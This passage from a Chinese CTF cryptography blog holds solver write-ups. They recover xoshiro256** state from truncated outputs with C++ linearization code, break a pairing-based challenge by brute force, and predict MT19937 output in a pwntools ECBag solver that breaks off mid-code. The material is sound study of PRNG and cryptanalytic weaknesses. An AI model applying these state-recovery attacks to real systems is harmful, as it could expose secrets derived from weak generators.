$||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg） 笔者注记：$\\lceil$ 和 $\\rceil$ 表示向上取整，例如 $\\lceil 1.2 \\rceil = 2$。 实现之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下 123def orthogonal_lattice(B): LB = B.transpose().left_kernel(basis=&quot;LLL&quot;).basis_matrix() return LB 但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下 12345678910def orthogonal_lattice(B): _d, _n = B.nrows(), B.ncols() _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4),20) # this bound can be adjusted as needed for b in B: _c *= b.norm() B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n)) B_r = B_bot.transpose().LLL() LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d,_n+_d)) assert (B*LB.transpose()).is_zero() return LB 参考 P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997. Modulus Fault Attacks Against RSA-CRT Signatures 知乎 线性代数之——正交向量与子空间 知乎 格拉姆矩阵（Gram matrix）详细解读","link":"/2022/08/18/2022%20%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20Crypto/"},{"title":"2023 BricsCTF - random","text":"持续复健中。。。 题目密码太狠了，这题也是 0 解。给了一个 Program.cs 如下： 1234var rng = new Random();byte[] Encrypt(byte[] x) =&gt; x.Select(a=&gt;(byte)(a^rng.Next(256))).ToArray();Console.WriteLine(Convert.ToHexString(Encrypt(File.ReadAllBytes(&quot;flag.txt&quot;))));Console.WriteLine(Convert.ToHexString(Encrypt(new byte[2000]))); 题文如下: 1This is xoshiro256** 1.0, one of our all-purpose, rock-solid generators. It has excellent (sub-ns) speed, a state (256 bits) that is large enough for any parallel application, and it passes all tests we are aware of. 分析在 GitHub 找到了 xoshiro256** 1.0 的源码，状态更新函数如下： 1234567ulong t = _s1 &lt;&lt; 17;_s2 ^= _s0;_s3 ^= _s1;_s1 ^= _s2;_s0 ^= _s3;_s2 ^= t;_s3 = BitOperations.RotateLeft(_s3, 45); 提出 result 的函数如下： 1result = BitOperations.RotateLeft(_s1 * 5, 7) * 9 看起来也是线性的，一开始想尝试像 MT19937 一样造个状态转移矩阵出来，但是理论上状态转移矩阵是 256 维的，而他给出了 8*2000=16000 个 bit，多太多了，结果也失败了。 题解用 Copilot 翻译一下官方的 wp 先。 当没有指定 seed 时，64 位机器上的最新版本的 C# 使用 xoshiro256** PRNG： 12345678910111213141516171819202122internal ulong NextUInt64(){ ulong s0 = _s0, s1 = _s1, s2 = _s2, s3 = _s3; ulong result = BitOperations.RotateLeft(s1 * 5, 7) * 9; ulong t = s1 &lt;&lt; 17; s2 ^= s0; s3 ^= s1; s1 ^= s2; s0 ^= s3; s2 ^= t; s3 = BitOperations.RotateLeft(s3, 45); _s0 = s0; _s1 = s1; _s2 = s2; _s3 = s3; return result;} 这个 RNG 的状态转移函数是 GF(2) 下的线性函数，而 result 是 s1 的非线性函数。如果我们能得到 NextUInt64 的精确返回值，那么就能轻松破解 RNG。我们可以通过乘以乘法逆元来将 s1 的每一位表示为初始状态的线性函数，构建一个线性方程组并解出初始状态。但是这道题给出的是 rng.Next(256) 的输出，就是只保留 result 的高 8 位（草，当时以为是低 8 位）。这样就无法从中获得 s1 的任何信息。 我们还可以检查在 result 的值确定的情况下，s1 的位之间是否存在固定的线性（或仿射）关系： 123456789101112131415161718from sage.all import *import randomdef f(x): x *= 5 x %= 2**64 x = (x &lt;&lt; 7) | (x &gt;&gt; (64 - 7)) x %= 2**64 x *= 9 x %= 2**64 return x &gt;&gt; 56vectors = [[] for _ in range(256)]for i in range(100000): a = random.getrandbits(64) v = vector(GF(2), '1' + bin(a)[2:].zfill(64)) vectors[f(a)].append(v)for i in range(256): mat = matrix(GF(2), vectors[i]) print(mat.rank(), len(vectors[i])) 对于每个 result 的值，这个程序生成了一些随机的 s1 的可能值，然后计算由这些值的位（和一个 1 来处理异或 1 的子集）生成的矩阵的秩。所有 256 个矩阵的秩都是 65，这意味着向量是独立的，对于任何 result 的值都不存在固定的仿射关系，因此无法从中获得任何信息。 这里的秩应该是倾向列秩，即他的意思是对于 s1 的 bits，不存在哪个 bit 能由其他 bits 线性组合（或者线性组合再取反）后得到。不是很明白检查这个有啥用。 可以获得概率线性关系，但是解线性系统就变成了 LPN（Learning Parity with Noise, 带噪声的学习奇偶校验）问题，据我所知，目前还没有足够快的算法。 LPN 问题具体来说是这样的：给定一个二进制矩阵 $A$ 和一个噪声向量 $e$，求解未知的二进制向量 $s$ 使得 $As + e = b\\pmod2$。其中，$A$ 是一个随机生成的二进制矩阵，$s$ 是一个未知的二进制向量，$e$ 是一个含有少量随机错误的二进制向量，$b$ 是我们观测到的结果向量。噪声向量 $e$ 的存在使得这个问题变得非常困难。 这里可能有多个解；我找到的解是检查二次关系： 这里不是很懂，为啥没有线性关系就能有二次关系。 假设 result 的值是固定的，可能存在非平凡的次数 &lt;=2 的布尔函数，当在 s1 上取值时总是为真。函数 f(...) = 1 符合这个描述，但是不值得考虑，因为它不提供任何信息。 函数可以写成 $$f(x_1, \\dots, x_{64}) = k_0 + \\sum_{i} k_i x_i + \\sum_{i \\le j} k_{ij} x_i x_j,$$ 并且 s1 的每一位都可以表示为 $\\sum_i k_i s_i$，其中 s 是初始状态。 我们可以直接将 s1 的位的表达式代入 $f$，展开括号并获得对初始状态为真的二次方程。 我们仍然需要找到这些二次布尔函数。这可以通过生成许多随机的 64 位向量来完成，这些向量对应于给定的 result &gt;&gt; 56 的值，为它们中的每一个计算所有 $1 + 64 + \\frac{64 \\cdot 63}2 = 2081$ 个单项式，并找到矩阵的核。实现在 gen_rels.cpp 中，它平均每个输出字节找到 23 个方程。 这使我们能够在 256 个变量上创建一个超定的二次方程组，它的初始状态是它的（希望是唯一的）解。我用来解决它的算法是线性化：我们可以将每个单项式（如 $x_1x_2$）视为单独的变量。然后我们将有一个线性方程组，其中 $1 + 256 + \\frac{256 \\cdot 255}2 = 32897$ 个变量，可以使用 M4RI 解决。实现在 hax.cpp 中，它期望 gen_rels.cpp 的输出在文件 list_rels 中，output.txt 的十六进制解码版本在文件 out_bin 中。 M4RI（Method of Four Russians for Inversion，四俄方法的逆运算方法）是一种针对有限域 GF(2) 上的矩阵运算（特别是矩阵求逆）的高效算法。它的名字来源于一种叫做“四俄罗斯算法”的技术，该技术是为了加速某些基本运算而发明的。在 Debian 系中可通过 sudo apt-get install libm4ri-dev 安装 M4RI 库。 gen_rel.cpp 如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;vector&gt;#include &lt;random&gt;#include &lt;m4ri/m4ri.h&gt;// we need to find degree 2 relations that hold certainlyuint8_t f(uint64_t x){ x *= 5; x = (x &lt;&lt; 7) | (x &gt;&gt; (64 - 7)); x *= 9; return x &gt;&gt; 56;}void process(uint8_t tgt){ std::mt19937_64 mt; size_t n_cols = 1; n_cols += 64; n_cols += 64 * 63 / 2; fprintf(stderr, &quot;%zu monomials\\n&quot;, n_cols); mzd_t *A = mzd_init(20000, n_cols); for(size_t ri = 0; ri &lt; A-&gt;nrows; ri++) { uint64_t x = 0; do x = mt(); while(f(x) != tgt); //printf(&quot;%zu\\n&quot;, x); size_t mi = 0; mzd_write_bit(A, ri, mi++, 1); for(size_t i = 0; i &lt; 64; i++) mzd_write_bit(A, ri, mi++, (x &gt;&gt; i) &amp; 1); for(size_t i = 0; i &lt; 64; i++) for(size_t j = 0; j &lt; i; j++) mzd_write_bit(A, ri, mi++, (x &gt;&gt; i) &amp; (x &gt;&gt; j) &amp; 1); assert(mi == n_cols); } mzd_t* ker = mzd_kernel_left_pluq(A, 0); fprintf(stderr, &quot;mat dim: %zu rows, %zu cols\\n&quot;, A-&gt;nrows, A-&gt;ncols); fprintf(stderr, &quot;ker dim: %zu rows, %zu cols\\n&quot;, ker-&gt;nrows, ker-&gt;ncols); mzd_t* tker = mzd_transpose(nullptr, ker); fprintf(stderr, &quot;tker dim: %zu rows, %zu cols\\n&quot;, tker-&gt;nrows, tker-&gt;ncols); mzd_free(A); mzd_free(ker); /* // check again that the relations are certain (not very fast) for(size_t ri = 0; ri &lt; tker-&gt;nrows; ri++) { for(size_t _ = 0; _ &lt; 100000; _++) { uint64_t x = 0; do x = mt(); while(f(x) != tgt); //printf(&quot;%zu\\n&quot;, x); size_t nm = 0; size_t mi = 0; nm ^= mzd_read_bit(tker, ri, mi++); for(size_t i = 0; i &lt; 64; i++) nm ^= mzd_read_bit(tker, ri, mi++) &amp; (x &gt;&gt; i) &amp; 1; for(size_t i = 0; i &lt; 64; i++) for(size_t j = 0; j &lt; i; j++) nm ^= mzd_read_bit(tker, ri, mi++) &amp; (x &gt;&gt; i) &amp; (x &gt;&gt; j) &amp; 1; //assert(mi == n_cols); assert(nm == 0); } } */ for(size_t ri = 0; ri &lt; tker-&gt;nrows; ri++) { printf(&quot;%d &quot;, (int)tgt); for(size_t ci = 0; ci &lt; tker-&gt;ncols; ci++) printf(&quot;%d&quot;, (int)mzd_read_bit(tker, ri, ci)); printf(&quot;\\n&quot;); } mzd_free(tker);}int main(){ for(size_t i = 0; i &lt; 256; i++) process(i);} hax.cpp 如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191#include &lt;array&gt;#include &lt;vector&gt;#include &lt;random&gt;#include &lt;bitset&gt;#include &lt;m4ri/m4ri.h&gt;uint8_t func(uint64_t x){ x *= 5; x = (x &lt;&lt; 7) | (x &gt;&gt; (64 - 7)); x *= 9; return x &gt;&gt; 56;}constexpr size_t N_MONO = 1 + 256 + 256 * 255 / 2;using deg2_rel = std::bitset&lt;1 + 256 + 256 * 255 / 2&gt;;using deg2_rel64 = std::bitset&lt;1 + 64 + 64 * 63 / 2&gt;;using lin_rel = std::bitset&lt;256&gt;;struct sym_u64{ lin_rel st[64] {}; sym_u64&amp; operator^=(const sym_u64&amp; rhs) { for(size_t i = 0; i &lt; 64; i++) st[i] ^= rhs.st[i]; return *this; } sym_u64 operator^(const sym_u64&amp; rhs) const { sym_u64 ret = *this; ret ^= rhs; return ret; } sym_u64 operator&lt;&lt;(int by) const { sym_u64 ret {}; for(size_t i = 0; i &lt; 64 - by; i++) ret.st[i + by] = st[i]; return ret; } sym_u64 operator&gt;&gt;(int by) const { sym_u64 ret {}; for(size_t i = 0; i &lt; 64 - by; i++) ret.st[i] = st[i + by]; return ret; } sym_u64 rotl(int by) const { sym_u64 ret {}; for(size_t i = 0; i &lt; 64; i++) ret.st[(i + by)%64] = st[i]; return ret; }};struct sym_xs256{ sym_u64 s0, s1, s2, s3; sym_xs256() { for(size_t i = 0; i &lt; 64; i++) { s0.st[i][i] = true; s1.st[i][i+64] = true; s2.st[i][i+128] = true; s3.st[i][i+192] = true; } } sym_u64 step() { sym_u64 res_s1 = s1; sym_u64 t = s1 &lt;&lt; 17; s2 ^= s0; s3 ^= s1; s1 ^= s2; s0 ^= s3; s2 ^= t; s3 = s3.rotl(45); return res_s1; }};std::array&lt;std::vector&lt;deg2_rel64&gt;, 256&gt; krels;deg2_rel to_deg2(lin_rel lhs){ deg2_rel ret {}; for(size_t i = 0; i &lt; 256; i++) ret[i+1] = lhs[i]; // 0 is the constant term return ret;}deg2_rel mul(lin_rel lhs, lin_rel rhs){ deg2_rel ret {}; // compute the product coefficients directly size_t mi = 1; for(size_t i = 0; i &lt; 256; i++) { ret[mi] = ret[mi] ^ (lhs[i] &amp; rhs[i]); mi++; } for(size_t i = 0; i &lt; 256; i++) for(size_t j = 0; j &lt; i; j++) { ret[mi] = ret[mi] ^ (lhs[i] &amp; rhs[j]); ret[mi] = ret[mi] ^ (lhs[j] &amp; rhs[i]); mi++; } return ret;}int main(){ FILE* f = fopen(&quot;list_rels&quot;, &quot;r&quot;); while(true) { char buf[4096]; int res = 0; int ok = fscanf(f, &quot;%d%s&quot;, &amp;res, buf); if(ok &lt; 2) break; deg2_rel64 rel {}; for(size_t i = 0; i &lt; rel.size(); i++) rel[i] = buf[i] - '0'; krels[res].push_back(std::move(rel)); } fclose(f); sym_xs256 rng {}; // we're targeting the state before the flag is encrypted so skip some bytes now f = fopen(&quot;out_bin&quot;, &quot;rb&quot;); constexpr int FLAG_LEN = 41; uint8_t encflag[FLAG_LEN]; for(size_t i = 0; i &lt; 41; i++) { encflag[i] = fgetc(f); rng.step(); } std::vector&lt;deg2_rel&gt; all_rels; for(size_t i = 0; i &lt; 2000; i++) { fprintf(stderr, &quot;i=%d\\n&quot;, i); uint8_t outb = fgetc(f); sym_u64 s1 = rng.step(); for(const deg2_rel64&amp; big_rel : krels[outb]) { deg2_rel res {}; size_t mi = 1; if(big_rel[0]) res[0] = res[0] ^ 1; for(size_t i = 0; i &lt; 64; i++) { if(big_rel[mi]) res ^= to_deg2(s1.st[i]); mi++; } for(size_t i = 0; i &lt; 64; i++) for(size_t j = 0; j &lt; i; j++) { if(big_rel[mi]) res ^= mul(s1.st[i], s1.st[j]); mi++; } all_rels.push_back(res); } } fclose(f); fprintf(stderr, &quot;%zu\\n&quot;, all_rels.size()); mzd_t *A = mzd_init(all_rels.size(), N_MONO); for(size_t i = 0; i &lt; all_rels.size(); i++) { for(size_t j = 0; j &lt; N_MONO; j++) mzd_write_bit(A, i, j, all_rels[i][j]); } // we solve this system by linearization fprintf(stderr, &quot;starting solve\\n&quot;); fprintf(stderr, &quot;mat dim: %zu rows, %zu cols\\n&quot;, A-&gt;nrows, A-&gt;ncols); mzd_t* ker = mzd_kernel_left_pluq(A, 0); mzd_t* tker = mzd_transpose(nullptr, ker); fprintf(stderr, &quot;tker dim: %zu rows, %zu cols\\n&quot;, tker-&gt;nrows, tker-&gt;ncols); mzd_free(A); mzd_free(ker); assert(tker-&gt;nrows == 1); // only 1 solution sym_xs256 rng2 {}; lin_rel ist; // the initial state. dot product with symbolic output equals concrete output for(size_t j = 0; j &lt; 256; j++) ist[j] = mzd_read_bit(tker, 0, j + 1); for(size_t i = 0; i &lt; FLAG_LEN; i++) { sym_u64 s1 = rng2.step(); uint64_t x = 0; for(size_t j = 0; j &lt; 64; j++) x |= uint64_t((s1.st[j] &amp; ist).count() % 2) &lt;&lt; j; uint8_t outb = func(x); printf(&quot;%c&quot;, encflag[i] ^ outb); } printf(&quot;\\n&quot;);} 我的想法首先我感觉这玩意挺抽象的，思路先不谈，光那俩 cpp 除了春哥我不知道还有谁能这么点时间内造出来。试着用 sage 写了下 gen_rels.cpp，直接慢了几十倍，好吧还是 C++ 厉害。（那之前的 MT19937 的题我是不是可以用 C++ 重写来着，又给自己挖个坑） 先看看 gen_rels.cpp 干了些啥：对每一个 0-255 的 target，找到 20000 个能让 f(x) == target 的 x，然后把这些 x 的每一位都当作一个变量，构造一个矩阵，然后求这个矩阵的核，这个核就是 f(x) == target 的所有关系的矩阵表示。这里的矩阵是 20000*2081 的，然后用 M4RI 求核。最终求出的每个向量与其对应 s1 expand 出的二次向量的内积都为 0。 再看 hax.cpp，疲软了，有空再来补坑。时隔大半年回来补了（ 这里面真是一堆语法可真是把没学过 C++ 的我搞得一头雾水。直接用最憨的方法，一个个看。 函数 func： 将 s1 转成 resultdeg2_rel 是一个 32897 维的向量，deg2_rel64 是 2081 维的向量，lin_rel 是 256 维的向量。struct sym_u64： 64 维的向量，每一个分量都是一个 lin_rel，那么这应该算一个 64*256 的矩阵，并定义其异或、左移、右移、循环左移操作。struct sym_xs256： 4 个 sym_u64 类型的 s1 s2 s3 s4，并定义了 step 操作，这里不是很懂，按理说这四个状态向量都是 64 位的。定义了一个 krels，包含 256 个 std::vector&lt;deg2_rel64&gt; 类型的元素。每一个 std::vector&lt;deg2_rel64&gt; 可以包含任意数量的 deg2_rel64 对象。 现在来看 main 函数：把 list_rels 文件中的内容读入到 krels 中。创建一个 sym_xs256 类的实例 rng，然后读进 encflag，每读一个字符更新一次 rng 的状态。对每一个泄露的字节，找到所有 krels 中对应的 big_rels，然后对每一个 big_rels，新建一个类型为 deg2_rel 的 res，常数项（0 号位）和 big_rels 取等，1-64 号位是 $(b_1, b_2, \\cdots, b_{64})\\cdot(s_1,s_2,\\cdots,s_{64})^T$，左边的 $b$ 即为 big_rels 的 1-64 号位，右边是 s1 的 64*256 矩阵。后面没看懂。 最后汇总到的一个 all_rels，求核得到的矩阵只有一个 32897 维的向量，剥出 1-256 号位得到 ist。 整个看下来就是迷迷糊糊的。 黑化了。 I recently contacted the author of this challenge for assistance and was surprised by his quick response. Despite it being 00:30 when I reached out, he replied by 02:30. Given his username, I assumed he was in Russia, but his response time led me to question whether his work and rest schedule is typical or if he is not currently in Russia. The key to understanding the classes sym_u64 and sym_xs256 lies in the fact that the four states can be represented as a 256-bit vector. This representation forms a linear system that omits the non-linear scrambler f(x). Thus, the state transition function can be expressed as a matrix, and the step function simply performs matrix multiplication. More specifically, the n-th state is obtained by multiplying the transition matrix $T$ by the initial state $n$ times. The construction of res can be explained as follows: First, it’s important to note that s1 is a 64x256 matrix which, when multiplied by ist, yields the current real state of s1. Each s1[i] is a 256-dimensional vector; its dot product with ist determines the i-th bit of the current s1.For each res in all_rels, res is computed by multiplying the big_rel (a 2081-dimensional vector) by a 2081x256 matrix, which is derived from s1. 参考https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cshttps://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md","link":"/2023/09/30/2023%20BricsCTF%20-%20random/"},{"title":"2025 红明谷杯 - Crypto","text":"队友把 flag 放生了，差点没重捕回来 qaq题目如下： 1234567891011121314151617181920212223242526from Crypto.Util.number import *from Crypto.Util.Padding import padfrom sage.all import *from functools import reducedef mul(numbers): return reduce(lambda x, y: x * y, numbers)res = [4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511, 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711]p = res[11]pp = mul(res)K = GF(p)E = EllipticCurve(K, (0, 4))qwq = 0x320238bqaq = E.order()//qwq**2flag = pad(open(&quot;flag.txt&quot;, &quot;rb&quot;).read().strip(),4)flag_part = [bytes_to_long(flag[i:i+2]) for i in range(0, len(flag), 2)]output = []for c in flag_part: P1 = qaq*E.random_element() P2 = qaq*E.random_element() out = P1.weil_pairing(P2, qwq)**3*c output.append(pow(out,qaq, pp))print(output) 比较简单，知道 pow(P1.weil_pairing(P2, qwq), qwq, pp) 为 1 这个性质就好搞了，直接爆破。 123456789101112131415161718from tqdm import trangeoutput = [2258729984869869545899085887518820011795880892632317458813070773270633871398785757696896679887453336507722151037267, 1843407310728065127389586068976768146728145160643439144895915852634291722663455873979176336542780552480617232750208, 1107061034832953338095294459542523703297843192927313275050958753437078121375795698115353665062727895555487155331316, 460337686287218470707660572908024613140030922587867288532588857547792028112129697850035268228038619747643899804437, 1659483062154723617504533638726171721668768657049197025961515070605996080663312140357834824850074607457421362000265, 3150528329201636320206556304125544975332446992414777732425647667048147102509308959254762895094589762017857965981432, 3338854035461286314545186888372727000962778038359519702308782495912356677650264814573463929190025956045491115654437, 3042574495339632074308497406446851120362994432361876743901608172567070991832258762751304397604780567703759317642849, 380771388315580393673388198522357440257018642337119013880143084485482127962577943753495690258532782147018511750175, 507222017133457507399048159541059729302482262298099528096040456818913085187752925782279385808732260473494863290057, 533663958640518878580794848474449572155795564171089765377581587253792204491009275840408579120376539757958097910250, 2681145160205204287930367627648683111546318004811732016137828270063753300095675791698398080219566725174890793619305, 3259478178021541801713314504097142165241891541242669456591074651894459393333167453811425864198267757724232689747676, 3553147298452254907907643059383506744982654808021508866104139240155822133286673657139615950259800036058045049186173, 1778776925369812510137824472396145391840300438509021838870105004154301861222612045533034046889878767915343446874895, 3409071358092535255033136229525415652816479844958949032220987821989305575696869929136493897719813036034016228268240, 571819148781137687997336847709735468532344087614483867682513640750800758034003212746545051127998686475933050072942, 2676666310158795770609746651024766841212271213339384335651155407291004834251914242990757216402110096603729617413168, 2557670339976470006330058052583841683167706755578266425502679937976714609864257535859316483527764340425703004883241, 973319024062640263364951783086923560907216776835485042157036675663719529568519121997200478026304141184810597275543, 1189768012357955450386827626693191057999220508190415783719135619271537446794904663649700073564180453068646130539863, 790522915783756530835443034667719516913120763875831140857606265058871034793645280121113275798239222760522467771184]qwq = 52437899qaq = 1455562845228184014106046353081846661166991594741034685342212005778133078550081291411839443612828739p = 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787pp = 1142978779632379969344384731816162212888551618412329487106182280460437948092775711025967355940728231074890740899064640830398142874211991038883733284039800714505967651759704707992207784798239393362313297134594620014689682614240673537974557609861073306584658917996634844473811713419516903992529010895368959512679762289061068750767272698410215219533780655490415972743692988039833721614365666351993335487907630409251025045193853809748905622077308664180480367745710426032292386656086977067733622324316251529279607679277315460682229036612415671436750122463497232354487970164567780660490851719503274520946852300175626980611392631378809761471008912076867118407483633023972770466259823927186918393298562128724829440836477986155752970694743829209037174635041410726609282526831341517005657513843064438822963889242924262793222516020047446160732380317460354380360631410063425737815245021223478414682926747310466080332446879064402066941673574937629942929233455490274643362453741527197512754992027588837742379352267575132076083027187211706722453314430311004216968206130931288118058422366846939843087867250208877457319655178776062205940749067608893888034471934498471108657546819750267606396282564760741394990056227498915716584453032204001863843912412620387842902864334464379557329439877766499721799090180106521949951507272088709752519109213448727550708629255894136853537524380257318749296652254490078801325565006537513324586727547784991700595087705177455733512116158384067200350557794061293097502070348758198384841013593727341655870858396981828914338167957355150495452710750066169828143717442866112149903974836803397451575951574758654598880735940075788671576674526836994715591739706357057699815597838906674624342854258780099739154689251277228387303286939318942508552968316726162904163233093355404058098725090760924700590208502555303625523880704006432299376446667399608178425319560581147711144539551105861283701119108963169437908720656474728443678191938587615688687790629662300315532804071728862616303844951511490625466845163653129560217890959711300145881339450565190571060840607910845859092526135249208093288167160336376760756304426346191389836338030781150259308295948794598941075005091244070210278000618109506241126900605449640742804019648207423896435466279361456668694686659046783765010159699708381871052284511858609936333837955434251107707443213658437730311109969181952584054470023007587546017226025865786999438913340937349025972249717158120517871211726893902696323141657820845379040062853354814032959005613852245360974457983567350637965684959556717166402357443319038744133853892077940635948927422008055364972815542308398644934412934780783306202098819759411204807373212433398053269281025972467100298781118011559579222633822445452194520775694259907477695015888131044620718709602314026156618474076423869840805574376019023676271040579611999127090671029103930178015883340947208339547flag = []for fp in output: target = pow(fp, qwq, p) for i in trange(65536): if pow(i, qwq*qaq, p) == target: print(i) flag.append(i) print(flag) breakfrom Crypto.Util.number import long_to_bytesflag = b''.join([long_to_bytes(i) for i in flag])print(flag) ECBag题目如下： 1234567891011121314151617181920from random import randint, choicefrom Crypto.Util.number import *from secret import flagp = getPrime(160)print(&quot;p =&quot;, p)a, b = int(input(&quot;a =&quot;)), int(input(&quot;b =&quot;))assert len(set([a%p, b%p, (a+b)%p, (a-b)%p])) == 4E1 = EllipticCurve(Zmod(p), [a, b])E2 = EllipticCurve(Zmod(p), [a+b, a-b])P, Q = E1.gens()[0], E2.gens()[0]n = 80s = [choice([0, bytes_to_long(flag)]) for _ in range(n)]sP, sQ = [_*P for _ in s], [_*Q for _ in s]AP, AQ = [randint(0, p) for _ in range(n)], [randint(0, p) for _ in range(n)]encP, encQ = sum([AP[_]*sP[_] for _ in range(n)]), sum([AQ[_]*sQ[_] for _ in range(n)])print(&quot;A =&quot;, [AP, AQ])print(&quot;enc =&quot;, [P.xy(), Q.xy(), encP.xy(), encQ.xy()]) 我不会椭圆曲线啊数一数发现竟然对于 MT19937 来说数据是够的，但是由于 randint 的原因，可能会有一些数据错位，具体来说就是他会先 getrandbits，如果这个数超过 p 了，那么就会继续生成，此时我们丢失了这个比较大的随机数，那么就得赌他 randint 生成的数据全在 p 以内，这样就跟 getrandbits 一样了。然后什么 DLP 也不太会，抄一抄代码，做一些优化，避免一下模逆不存在的情况。每次都会跑出一个 flag mod N，flag 比较大的情况要多出几次做 CRT，实测一般大概 200 次左右出完整的。远程环境 10 秒一个 getPrime(160)，太逆天了。一开始跑出来了一个，队友没交直接把容器关了，放生一个 flag，差点 GG，还好又跑出来了，就是一血没了。非预期图一乐，没啥学习价值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157from pwn import *from sage.all import *import astfrom Crypto.Util.number import bytes_to_long, long_to_bytesimport syssys.path.append('./MT19937-Symbolic-Execution-and-Solver-master/source')from MT19937 import MT19937, MT19937_symbolicfrom tqdm import trangeimport itertoolscontext.log_level = 'error'def main(): r = process(['sage', 'task.sage']) r.recvuntil(b'p =') p = int(r.recvline().strip()) from sage.parallel.multiprocessing_sage import pyprocessing def find_ab_worker(*args): p, attempts = args import random for _ in range(attempts): a = random.randint(1, p-1) b = random.randint(1, p-1) try: E1 = EllipticCurve(Zmod(p), [a, b]) E2 = EllipticCurve(Zmod(p), [a+b, a-b]) E1o = E1.order() E2o = E2.order() except: continue m1 = prod(list(filter(lambda x: x &lt; 2 ** 32, (base ** exp for base, exp in factor(E1o))))) m2 = prod(list(filter(lambda x: x &lt; 2 ** 32, (base ** exp for base, exp in factor(E2o))))) ml1 = m1.bit_length() ml2 = m2.bit_length() if ml1 &gt; 40 and ml2 &gt; 40 and (ml1 + ml2) &gt; 120: return (a, b) return None def find_ab(p, processes=20, batch_size=2): parallel_iter = pyprocessing(processes) P = parallel(p_iter=parallel_iter) while True: inputs = [((p, batch_size), {}) for _ in range(processes) ] results = list(P(find_ab_worker)(inputs)) for res in results: if res[1] is not None: return res[1] a, b = find_ab(p) r.sendlineafter(b'a =', str(a).encode()) r.sendlineafter(b'b =', str(b).encode()) r.recvuntil(b'A =') A_data = r.recvline().strip().decode() AP, AQ = ast.literal_eval(A_data) r.recvuntil(b'enc =') enc_data = r.recvline().strip().decode() enc_points = ast.literal_eval(enc_data) P_xy, Q_xy, encP_xy, encQ_xy = enc_points E1 = EllipticCurve(GF(p), [a, b]) E2 = EllipticCurve(GF(p), [a+b, a-b]) P = E1(*P_xy) Q = E2(*Q_xy) encP = E1(*encP_xy) encQ = E2(*encQ_xy) known = AP + AQ[:45] data = [] for i in known: for _ in range(5): data.append(i &amp; 2**32-1) i &gt;&gt;= 32 data = data[:624] try: rng = MT19937(state_from_data = (data, 32)) except: r.close() return None for tryrev in trange(80, 300): rng = MT19937(state_from_data = (data, 32)) rng.reverse_states(tryrev) m_list = [rng() &gt;&gt; 30 for _ in range(tryrev)] s = [] for i in m_list: if i &lt;= 1: s.append(i) if len(s) == 80: break E1o = E1.order() E2o = E2.order() def dl(Q, P, n, filnum): primes = list(filter(lambda x: x &lt; 2 ** 32 and gcd(x, filnum) == 1, (base ** exp for base, exp in factor(n)))) dlogs = [] for fac in primes: t = int(n) // int(fac) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs.append(dlog) k = int(crt(dlogs,primes)) return k, prod(primes) sAP = sum([s[i]*AP[i] for i in range(80)]) sAQ = sum([s[i]*AQ[i] for i in range(80)]) 